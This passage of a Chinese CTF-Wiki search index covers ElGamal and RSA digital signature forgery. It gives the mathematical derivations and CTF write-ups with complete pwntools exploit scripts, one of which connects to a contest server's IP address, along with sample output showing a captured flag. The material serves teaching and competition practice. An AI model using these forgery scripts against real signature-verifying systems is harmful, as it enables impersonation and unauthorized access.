g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p</p> <p>\u53c8\u7531\u4e8e\u6d88\u606fm\u7684\u6784\u9020\u65b9\u5f0f\uff0c\u6240\u4ee5</p>  g^{si} \\equiv g^m \\bmod p-1  <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\u7684\u6d88\u606f\uff0c\u4f46\u662f\u4ed6\u5374\u65e0\u6cd5\u4f2a\u9020\u6307\u5b9a\u683c\u5f0f\u7684\u6d88\u606f\u3002\u800c\u4e14\uff0c\u4e00\u65e6\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u64cd\u4f5c\uff0c\u8fd9\u4e00\u653b\u51fb\u5c31\u4e0d\u518d\u53ef\u884c\u3002</p>"},{"location":"crypto/signature/elgamal/#_12","title":"\u5df2\u77e5\u7b7e\u540d\u4f2a\u9020","text":""},{"location":"crypto/signature/elgamal/#_13","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053(r, s)\u662f\u6d88\u606fM\u7684\u7b7e\u540d\uff0c\u5219\u653b\u51fb\u8005\u53ef\u5229\u7528\u5b83\u6765\u4f2a\u9020\u5176\u5b83\u6d88\u606f\u7684\u7b7e\u540d\u3002</p>"},{"location":"crypto/signature/elgamal/#_14","title":"\u539f\u7406","text":"<ol> <li>\u9009\u62e9\u6574\u6570h, i, j \\in[0, p-2]\u4e14\u6ee1\u8db3\\operatorname{gcd}(h r-j s, \\varphi(p))=1</li> <li>\u8ba1\u7b97\u4e0b\u5f0f    \\begin{array}{l}    r^{\\prime}=r^{h} \\alpha^{i} y_{A}^{j} \\bmod p \\\\    s^{\\prime}=\\operatorname{sr}(h r-j s)^{-1} \\bmod \\varphi(p) \\\\    m^{\\prime}=r^{\\prime}(h m+i s)(h r-j s)^{-1} \\bmod \\varphi(p)    \\end{array}</li> </ol> <p>\u53ef\u5f97\u5230(r',s')\u662fm'\u7684\u6709\u6548\u7b7e\u540d</p> <p>\u8bc1\u660e\u5982\u4e0b:</p> <p>\u5df2\u77e5Alice\u5bf9\u6d88\u606fx\u7684\u7b7e\u540d(\\gamma,\\delta)\u6ee1\u8db3\\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p)\uff0c\u6240\u4ee5\u6211\u4eec\u76ee\u7684\u4e3a\u6784\u9020\u51fa\\left(x^{\\prime}, \\lambda, \\mu\\right)\u6ee1\u8db3</p>  \\beta^{\\lambda} \\lambda^{\\mu} \\equiv \\alpha^{x'}(\\bmod p)  <p>\u90a3\u4e48\uff0c\u9996\u5148\u6211\u4eec\u628a\\lambda\u8868\u793a\u4e3a\u4e09\u4e2a\u5df2\u77e5\u5e95\\alpha, \\beta, \\gamma\u7684\u5f62\u5f0f: \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p,\u7531\u6761\u4ef6\u53ef\u5f97</p>  \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \\Leftrightarrow \\gamma=\\left(\\beta^{-\\gamma} \\alpha^{x}\\right)^{\\delta-1} \\bmod p  <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5f97\u5230</p>  \\lambda=\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h} \\bmod p  <p>\u6211\u4eec\u628a\\lambda\u7684\u8868\u8fbe\u5f0f\u4ee3\u5165\u4e00\u5f0f\u4e2d</p>  \\begin{aligned}&amp; \\beta^{\\lambda}\\left(\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h}\\right)^{\\mu} \\equiv \\alpha^{x^{\\prime}}(\\bmod p) \\\\\\Leftrightarrow &amp; \\beta^{\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu} \\equiv \\alpha^{x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu}(\\bmod p)\\end{aligned}  <p>\u6211\u4eec\u4ee4\u4e24\u8fb9\u6307\u6570\u4e3a0, \u5373</p>  \\left\\{\\begin{matrix}\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\\\ x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\end{matrix}\\right.  <p>\u53ef\u4ee5\u5f97\u5230</p>  \\mu=\\delta \\lambda(h \\gamma-j \\delta)^{-1} \\quad(\\bmod p-1)  \\\\ x^{\\prime}=\\lambda(h x+i \\delta)(h \\gamma-j \\delta)^{-1}(\\bmod p-1)  <p>\u5176\u4e2d</p>  \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p  <p>\u6240\u4ee5\u6211\u4eec\u5f97\u5230(\\lambda, \\mu)\u662f x' \u7684\u6709\u6548\u7b7e\u540d\u3002</p> <p>\u6b64\u5916,\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9CRT\u6784\u9020m', \u539f\u7406\u5982\u4e0b:</p> <ol> <li>u=m^{\\prime} m^{-1} \\bmod \\varphi(p), \\quad s^{\\prime}=s u \\bmod \\varphi(p)</li> <li>\u518d\u8ba1\u7b97r^{\\prime}, \\quad r^{\\prime} \\equiv r u \\bmod \\varphi(p), r^{\\prime} \\equiv r \\bmod p</li> </ol> <p>\u663e\u7136\u53ef\u4ee5\u4f7f\u7528CRT\u6c42\u89e3r', \u6ce8\u610f\u5230 y_{A}^{r'} r'^{s^{\\prime}}=y_{A}^{ru} r^{s u}=\\left(y_{A}^{r} r^{s}\\right)^{u}=\\alpha^{m u} \\equiv \\alpha^{m} \\bmod p </p> <p>\u6240\u4ee5(r',s')\u662f\u6d88\u606fm'\u7684\u6709\u6548\u7b7e\u540d\u3002</p> <p>\u62b5\u6297\u63aa\u65bd:\u5728\u9a8c\u8bc1\u7b7e\u540d\u65f6, \u68c0\u67e5r &lt; p\u3002</p>"},{"location":"crypto/signature/elgamal/#_15","title":"\u9009\u62e9\u7b7e\u540d\u4f2a\u9020","text":""},{"location":"crypto/signature/elgamal/#_16","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u6211\u4eec\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f97\u5230\u7b7e\u540d\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u65b0\u7684\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u591f\u9009\u62e9\u7b7e\u540d\u7684\u6d88\u606f\u4f2a\u9020\u7b7e\u540d\u3002</p>"},{"location":"crypto/signature/elgamal/#_17","title":"\u539f\u7406","text":"<p>\u6211\u4eec\u77e5\u9053\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u5982\u4e0b</p> <p>g^m \\equiv y^rr^s \\bmod p </p> <p>\u90a3\u4e48\u53ea\u8981\u6211\u4eec\u9009\u62e9\u4e00\u4e2a\u6d88\u606fm\u4f7f\u5176\u548c\u6211\u4eec\u6240\u8981\u4f2a\u9020\u7684\u6d88\u606fm'\u6a21p-1\u540c\u4f59\uff0c\u7136\u540e\u540c\u65f6\u4f7f\u7528\u6d88\u606fm\u7684\u7b7e\u540d\u5373\u53ef\u7ed5\u8fc7\u3002</p>"},{"location":"crypto/signature/elgamal/#_18","title":"\u9898\u76ee","text":"<p>\u8fd9\u91cc\u4ee52017\u5e74\u56fd\u8d5bmailbox\u4e3a\u4f8b\uff0ci\u6625\u79cb\u6709\u590d\u73b0\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u8fdb\u884cproof of work</p> <p><pre><code>    proof = b64.b64encode(os.urandom(12))\n    req.sendall(\n        \"Please provide your proof of work, a sha1 sum ending in 16 bit's set to 0, it must be of length %d bytes, starting with %s\\n\" % (\n        len(proof) + 5, proof))\n\n    test = req.recv(21)\n    ha = hashlib.sha1()\n    ha.update(test)\n\n    if (test[0:16] != proof or ord(ha.digest()[-1]) != 0 or ord(ha.digest()[-2]) != 0): # or ord(ha.digest()[-3]) != 0 or ord(ha.digest()[-4]) != 0):\n        req.sendall(\"Check failed\")\n        req.close()\n        return \n</code></pre> \u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u4ee5proof\u5f00\u5934\u7684\u957f\u5ea6\u4e3aproof\u957f\u5ea6\u52a05\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5176sha1\u7684\u503c\u4ee516\u6bd4\u7279\u76840\u7ed3\u675f\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7\u3002</p> <pre><code>def f(x):\n    return sha1(prefix + x).digest()[-2:] == '\\0\\0'\n\n\nsh = remote('106.75.66.195', 40001)\n# bypass proof\nsh.recvuntil('starting with ')\nprefix = sh.recvuntil('\\n', drop=True)\nprint string.ascii_letters\ns = util.iters.mbruteforce(f, string.ascii_letters + string.digits, 5, 'fixed')\ntest = prefix + s\nsh.sendline(test)\n</code></pre> <p>\u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\u4e2d\u7684util.iters.mbruteforce\uff0c\u8fd9\u662f\u4e00\u4e2a\u5229\u7528\u7ed9\u5b9a\u5b57\u7b26\u96c6\u5408\u4ee5\u53ca\u6307\u5b9a\u957f\u5ea6\u8fdb\u884c\u591a\u7ebf\u7a0b\u7206\u7834\u7684\u51fd\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7206\u7834\u51fd\u6570\uff0c\u8fd9\u91cc\u662fsha1\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u96c6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u8282\u6570\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u6307\u7684\u662f\u6211\u4eec\u53ea\u5c1d\u8bd5\u5b57\u8282\u6570\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u5b57\u8282\u6570\u7684\u6392\u5217\uff0c\u5373\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\u3002\u66f4\u52a0\u5177\u4f53\u7684\u4fe1\u606f\u8bf7\u53c2\u8003pwntools\u3002</p> <p>\u7ed5\u8fc7\u4e4b\u540e\uff0c\u6211\u4eec\u7ee7\u7eed\u5206\u6790\u7a0b\u5e8f\uff0c\u7b80\u5355\u770b\u4e0bgenerate_keys\u51fd\u6570\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u51fd\u6570\u662fElGamal\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u770b\u4e86\u770bverify\u51fd\u6570\uff0c\u5c31\u662f\u9a8c\u8bc1\u7b7e\u540d\u7684\u8fc7\u7a0b\u3002</p> <p>\u7ee7\u7eed\u5206\u6790</p> <pre><code>            if len(msg) &gt; MSGLENGTH:\n                req.sendall(\"what r u do'in?\")\n                req.close()\n                return\n            if msg[:4] == \"test\":\n                r, s = sign(digitalize(msg), sk, pk, p, g)\n                req.sendall(\"Your signature is\" + repr((hex(r), hex(s))) + \"\\n\")\n            else:\n                if msg == \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test:\n                    req.sendall(\"Signature:\")\n                    sig = self.rfile.readline().strip()\n                    if len(sig) &gt; MSGLENGTH:\n                        req.sendall(\"what r u do'in?\")\n                        req.close()\n                        return\n                    sig_rs = sig.split(\",\")\n                    if len(sig_rs) &lt; 2:\n                        req.sendall(\"yo what?\")\n                        req.close()\n                        return\n                    # print \"Got sig\", sig_rs\n                    if verify(digitalize(msg), int(sig_rs[0]), int(sig_rs[1]), pk, p, g):\n                        req.sendall(\"Login Success.\\nDr. Ziegler has a message for you: \" + FLAG)\n                        print \"shipped flag\"\n                        req.close()\n                        return\n                    else:\n                        req.sendall(\"You are not the Genji I knew!\\n\")\n</code></pre> <p>\u6839\u636e\u8fd9\u4e09\u4e2aif\u6761\u4ef6\u53ef\u4ee5\u77e5\u9053</p> <ul> <li>\u6211\u4eec\u7684\u6d88\u606f\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7MSGLENGTH\uff0c40000\u3002</li> <li>\u6211\u4eec\u53ef\u4ee5\u5bf9\u6d88\u606f\u5f00\u5934\u4e3atest\u7684\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\u3002</li> <li>\u6211\u4eec\u9700\u8981\u4f7f\u5f97\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\uff0c\u4ee5\u6211\u4eec\u7ed5\u8fc7proof\u7684test\u4e3a\u7ed3\u5c3e\u7684\u6d88\u606f\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u63d0\u4f9b\u7b7e\u540d\u7684\u503c\u3002</li> </ul> <p>\u5206\u6790\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5c31\u77e5\u9053\u4e86\uff0c\u6211\u4eec\u5c31\u662f\u5728\u9009\u62e9\u6307\u5b9a\u7b7e\u540d\u8fdb\u884c\u4f2a\u9020\uff0c\u8fd9\u91cc\u6211\u4eec\u81ea\u7136\u8981\u5145\u5206\u5229\u7528\u7b2c\u4e8c\u4e2aif\u6761\u4ef6\uff0c\u53ea\u8981\u6211\u4eec\u786e\u4fdd\u6211\u4eec\u8f93\u5165\u7684\u6d88\u606f\u7684\u5f00\u5934\u4e3a\u2018test\u2019\uff0c\u5e76\u4e14\u8be5\u6d88\u606f\u4e0e\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u6a21p-1\u540c\u4f59\uff0c\u6211\u4eec\u5373\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002</p> <p>\u90a3\u6211\u4eec\u5982\u4f55\u6784\u9020\u5462\uff1f\u65e2\u7136\u6d88\u606f\u7684\u957f\u5ea6\u53ef\u4ee5\u8db3\u591f\u957f\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06'test'\u5bf9\u5e94\u768416\u8fdb\u5236\u5148\u5de6\u79fb\u5f97\u5230\u6bd4p-1\u5927\u7684\u6570\u5b57a\uff0c\u7136\u540e\u7528a\u5bf9p-1\u53d6\u6a21\uff0c\u7528a\u518d\u51cf\u53bb\u4f59\u6570\uff0c\u6b64\u65f6a\u6a21p-1\u4f590\u4e86\u3002\u8fd9\u65f6\u518d\u52a0\u4e0a\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u7684\u503c\uff0c\u5373\u5b9e\u73b0\u4e86\u6a21p-1\u540c\u4f59\u3002</p> <p>\u5177\u4f53\u5982\u4e0b</p> <pre><code># construct the message begins with 'test'\ntarget = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test\npart1 = (digitalize('test' + os.urandom(51)) &lt;&lt; 512) // (p - 1) * (p - 1)\nvictim = part1 + digitalize(target)\nwhile 1:\n    tmp = hex(victim)[2:].decode('hex')\n    if tmp.startswith('test') and '\\n' not in tmp:\n        break\n    else:\n        part1 = (digitalize('test' + os.urandom(51)) &lt;&lt; 512) // (p - 1) * (\n            p - 1)\n        victim = part1 + digitalize(target)\n</code></pre> <p>\u6700\u540e\u7684\u811a\u672c\u5982\u4e0b</p> <pre><code>from pwn import *\nfrom hashlib import sha1\nimport string\nimport ast\nimport os\nimport binascii\ncontext.log_level = 'debug'\n\n\ndef f(x):\n    return sha1(prefix + x).digest()[-2:] == '\\0\\0'\n\n\ndef digitalize(m):\n    return int(m.encode('hex'), 16)\n\n\nsh = remote('106.75.66.195', 40001)\n# bypass proof\nsh.recvuntil('starting with ')\nprefix = sh.recvuntil('\\n', drop=True)\nprint string.ascii_letters\ns = util.iters.mbruteforce(f, string.ascii_letters + string.digits, 5, 'fixed')\ntest = prefix + s\nsh.sendline(test)\n\nsh.recvuntil('Current PK we are using: ')\npubkey = ast.literal_eval(sh.recvuntil('\\n', drop=True))\np = pubkey[0]\ng = pubkey[1]\npk = pubkey[2]\n\n# construct the message begins with 'test'\ntarget = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test\npart1 = (digitalize('test' + os.urandom(51)) &lt;&lt; 512) // (p - 1) * (p - 1)\nvictim = part1 + digitalize(target)\nwhile 1:\n    tmp = hex(victim)[2:].decode('hex')\n    if tmp.startswith('test') and '\\n' not in tmp:\n        break\n    else:\n        part1 = (digitalize('test' + os.urandom(51)) &lt;&lt; 512) // (p - 1) * (\n            p - 1)\n        victim = part1 + digitalize(target)\n\nassert (victim % (p - 1) == digitalize(target) % (p - 1))\n\n# get victim signature\nsh.sendline(hex(victim)[2:].decode('hex'))\nsh.recvuntil('Your signature is')\nsig = ast.literal_eval(sh.recvuntil('\\n', drop=True))\nsig = [int(sig[0], 0), int(sig[1], 0)]\n\n# get flag\nsh.sendline(target)\nsh.sendline(str(sig[0]) + \",\" + str(sig[1]))\nsh.interactive()\n</code></pre> <p>\u8fd9\u91cc\u8fd8\u8981\u8bf4\u51e0\u4e2a\u6709\u610f\u601d\u7684\u70b9\u5c31\u662f</p> <ul> <li>int(x,0)\u53ea\u7684\u662f\u5c06x\u6309\u7167\u5176\u5b57\u9762\u5bf9\u5e94\u7684\u8fdb\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4int('0x12',0)=18\uff0c\u8fd9\u91cc\u76f8\u5e94\u7684\u5b57\u9762\u5fc5\u987b\u6709\u5bf9\u5e94\u6807\u5fd7\u5f00\u5934\uff0c\u6bd4\u5982\u8bf4\u5341\u516d\u8fdb\u5236\u662f0x,8\u8fdb\u5236\u662f0\uff0c\u4e8c\u8fdb\u5236\u662f0b\u3002\u56e0\u4e3a\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u8bc6\u522b\u4e86\u3002</li> <li>python(python2) \u91cc\u9762\u5230\u5e95\u591a\u5927\u7684\u6570\uff0c\u8ba1\u7b97\u51fa\u6765\u6700\u540e\u624d\u4f1a\u5e26\u6709L\u5462\uff1f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u4e8eint\u90fd\u4f1a\u6709L\u3002\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u7684victim\u786e\u5b9e\u662f\u6ca1\u6709\u7684\uff0c\uff0c \u4e00\u4e2a\u95ee\u9898\uff0c\u5f85\u89e3\u51b3\u3002\u3002</li> </ul>"},{"location":"crypto/signature/introduction/","title":"\u6570\u5b57\u7b7e\u540d","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\uff0c\u6211\u4eec\u5728\u53c2\u52a0\u67d0\u4e2a\u6d3b\u52a8\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u7b7e\u540d\uff0c\u4ee5\u4fbf\u4e8e\u8bc1\u660e\u6211\u4eec\u786e\u5b9e\u5230\u573a\u4e86\uff0c\uff0c\uff0c\u9632\u6b62\u5bfc\u5458\u5565\u7684\uff0c\u4f60\u61c2\u5f97\u3002\u3002\u3002\u4f46\u5176\u5b9e\u5427\uff0c\u8fd9\u79cd\u7b7e\u540d\u5f88\u5bb9\u6613\u88ab\u4f2a\u9020\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u4eba\u4ee3\u7b7e\u4e00\u4e0b\uff0c\u6216\u8005\u8bf4\u627e\u4e00\u4e2a\u4f1a\u6a21\u4eff\u522b\u4eba\u5b57\u8ff9\u7684\u4eba\u5e2e\u5fd9\u7b7e\u4e00\u4e0b\u3002\u5728\u8ba1\u7b97\u673a\u4e16\u754c\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9700\u8981\u7535\u5b50\u7b7e\u540d\uff0c\u56e0\u4e3a\u6211\u4eec\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528\u7535\u5b50\u6587\u4ef6\uff0c\u90a3\u8fd9\u65f6\u5019\u600e\u4e48\u529e\u5462\uff1f\u5f53\u7136\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u81ea\u5df1\u7684\u540d\u5b57\u3002\u4f46\u5176\u5b9e\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u90a3\u5c31\u662f\u91c7\u7528\u6570\u5b57\u7b7e\u540d\uff0c\u8fd9\u79cd\u7b7e\u540d\u66f4\u52a0\u96be\u4ee5\u4f2a\u9020\uff0c\u53ef\u4fe1\u7a0b\u5ea6\u66f4\u9ad8\u3002\u6570\u5b57\u7b7e\u540d\u7684\u4e3b\u8981\u7528\u5904\u662f\u786e\u4fdd\u6d88\u606f\u786e\u5b9e\u6765\u81ea\u4e8e\u58f0\u79f0\u4ea7\u751f\u8be5\u6d88\u606f\u7684\u4eba\u3002</p> <p>\u6570\u5b57\u7b7e\u540d\uff08digital signature\uff09\u4e3b\u8981\u7528\u4e8e\u5bf9\u6570\u5b57\u6d88\u606f\uff08digital message\uff09\u8fdb\u884c\u7b7e\u540d\uff0c\u4ee5\u9632\u6d88\u606f\u7684\u5192\u540d\u4f2a\u9020\u6216\u7be1\u6539\uff0c\u4ea6\u53ef\u4ee5\u7528\u4e8e\u901a\u4fe1\u53cc\u65b9\u7684\u8eab\u4efd\u9274\u522b\u3002</p> <p>\u6570\u5b57\u7b7e\u540d\u4f9d\u8d56\u4e8e\u975e\u5bf9\u79f0\u5bc6\u7801\uff0c\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u4e00\u65b9\u80fd\u591f\u505a\u7684\u4e8b\u60c5\uff0c\u800c\u53e6\u4e00\u65b9\u4e0d\u80fd\u591f\u505a\u51fa\u8fd9\u6837\u7684\u4e8b\u60c5\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b</p> <p></p> <p>\u6570\u5b57\u7b7e\u540d\u5e94\u5f53\u5177\u6709\u4ee5\u4e0b\u51e0\u4e2a\u7279\u6027\uff1a</p> <p>(1) \u7b7e\u540d\u662f\u53ef\u4fe1\u7684\uff1a\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u9a8c\u8bc1\u7b7e\u540d\u7684\u6709\u6548\u6027\u3002</p> <p>(2) \u7b7e\u540d\u662f\u4e0d\u53ef\u4f2a\u9020\u7684\uff1a\u9664\u4e86\u5408\u6cd5\u7684\u7b7e\u540d\u8005\u4e4b\u5916\uff0c\u4efb\u4f55\u5176\u4ed6\u4eba\u4f2a\u9020\u5176\u7b7e\u540d\u662f\u56f0\u96be\u7684\u3002</p> <p>(3) \u7b7e\u540d\u662f\u4e0d\u53ef\u590d\u5236\u7684\uff1a\u5bf9\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u4e0d\u80fd\u901a\u8fc7\u590d\u5236\u53d8\u4e3a\u53e6\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u3002\u5982\u679c\u5bf9\u4e00\u4e2a\u6d88\u606f\u7684\u7b7e\u540d\u662f\u4ece\u522b\u5904\u590d\u5236\u5f97\u5230\u7684\uff0c\u5219\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u53d1\u73b0\u6d88\u606f\u4e0e\u7b7e\u540d\u4e4b\u95f4\u7684\u4e0d\u4e00\u81f4\u6027\uff0c\u4ece\u800c\u53ef\u4ee5\u62d2\u7edd\u7b7e\u540d\u7684\u6d88\u606f\u3002</p> <p>(4) \u7b7e\u540d\u7684\u6d88\u606f\u662f\u4e0d\u53ef\u6539\u53d8\u7684\uff1a\u7ecf\u7b7e\u540d\u7684\u6d88\u606f\u4e0d\u80fd\u88ab\u7be1\u6539\u3002\u4e00\u65e6\u7b7e\u540d\u7684\u6d88\u606f\u88ab\u7be1\u6539\uff0c\u5219\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u53d1\u73b0\u6d88\u606f\u4e0e\u7b7e\u540d\u4e4b\u95f4\u7684\u4e0d\u4e00\u81f4\u6027\u3002</p> <p>(5) \u7b7e\u540d\u662f\u4e0d\u53ef\u62b5\u8d56\u7684\uff1a\u7b7e\u540d\u8005\u4e8b\u540e\u4e0d\u80fd\u5426\u8ba4\u81ea\u5df1\u7684\u7b7e\u540d\u3002</p>"},{"location":"crypto/signature/rsa/","title":"RSA \u6570\u5b57\u7b7e\u540d","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/signature/rsa/#_1","title":"\u539f\u7406","text":"<p>\u539f\u7406\u7c7b\u4f3c\u4e8e RSA \u52a0\u5bc6\uff0c\u53ea\u662f\u8fd9\u91cc\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u4f5c\u4e3a\u7b7e\u540d\u3002</p>"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix1","title":"2018 Backdoor Awesome mix1","text":"<p>\u9996\u5148\uff0c\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u6e90\u7801\uff0c\u8fd9\u91cc\u7a0b\u5e8f\u4f7f\u7528 PKCS1_V1.5 \u8fdb\u884c\u4e86 RSA \u7b7e\u540d\uff0c\u8fd9\u4f1a\u5bf9\u660e\u6587\u6d88\u606f\u8fdb\u884c\u6269\u5c55\uff0c\u5177\u4f53\u6269\u5c55\u89c4\u5219\u8bf7\u53c2\u8003 https://www.emc.com/collateral/white-papers/h11300-pkcs-1v2-2-rsa-cryptography-standard-wp.pdf \u3002\u8fd9\u91cc\u7ed9\u51fa\u5bf9\u5e94\u6269\u5c55\u811a\u672c\uff0c\u5bf9\u5e94\u4e8e\u9898\u76ee\u4e2d\u7684 <code>from Util import PKCS1_pad as pad</code> </p> <pre><code>def PKCS1_pad(data):\n    asn1 = \"3021300906052b0e03021a05000414\"\n    ans = asn1 + data\n    n = len(ans)\n    return int(('00' + '01' + 'ff' * (1024 / 8 - n / 2 - 3) + '00' + ans), 16)\n</code></pre> <p>\u7a0b\u5e8f\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa <code>n,e</code> \u4f7f\u5f97\u7a0b\u5e8f\u6ee1\u8db3 </p> <p>h(m)^e mod \\ n=pad(m)</p> <p>\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 <code>h(m)\uff0cpad(m)</code>\u3002\u663e\u7136\u5982\u679c\u6211\u4eec\u63a7\u5236 <code>e=1</code>\u7684\u8bdd\uff0c\u90a3\u4e48</p> <p>h(m)-pad(m)=kn</p> <p>\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e k=1\uff0c\u65e2\u53ef\u4ee5\u5f97\u5230 n\u3002</p> <p>\u672c\u5730\u90e8\u7f72 <code>socat TCP4-LISTEN:12345,fork EXEC:./mix1.py</code>\u3002</p> <p>exp \u5982\u4e0b</p> <pre><code>from Crypto.Hash import SHA\nfrom pwn import *\n\nfrom Util import PKCS1_pad\n\n#context.log_level = 'debug'\n\n\ndef main():\n    port = 12345\n    host = \"127.0.0.1\"\n    p = remote(host, port)\n    p.recvuntil('Message   -&gt; ')\n    message = p.recvuntil('\\n\\nSignature -&gt; ', drop=True)\n    log.info('message: ' + message)\n    signature = p.recvuntil('\\n', drop=True)\n    log.info('signature: ' + signature)\n\n    h = SHA.new(message)\n\n    m = PKCS1_pad(h.hexdigest())\n\n    e = 1\n    n = int(signature, 16) - m\n\n    p.sendlineafter('Enter n:', str(n))\n    p.sendlineafter('Enter e:', str(e))\n\n    p.interactive()\n\n\nmain()\n</code></pre> <p>\u6548\u679c\u5982\u4e0b</p> <pre><code>\u279c  2018-BackdoorCTF-Awesome-mix1 git:(master) python exp.py\n[+] Opening connection to 127.0.0.1 on port 12345: Done\n[*] message: super important information for admin only\n[*] signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f\n[*] Switching to interactive mode\nCTF{cryp70_5ur3_15_w13rd}\n[*] Got EOF while reading in interactive\n</code></pre>"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix2","title":"2018 Backdoor Awesome mix2","text":"<p>\u672c\u5730\u90e8\u7f72 <code>socat TCP4-LISTEN:12345,fork EXEC:./service.py</code>\u3002</p> <p>\u9898\u76ee\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u7684\u9898\u76ee\uff0c\u552f\u4e00\u7684\u533a\u522b\u5728\u4e8e\u5bf9\u4e8e e 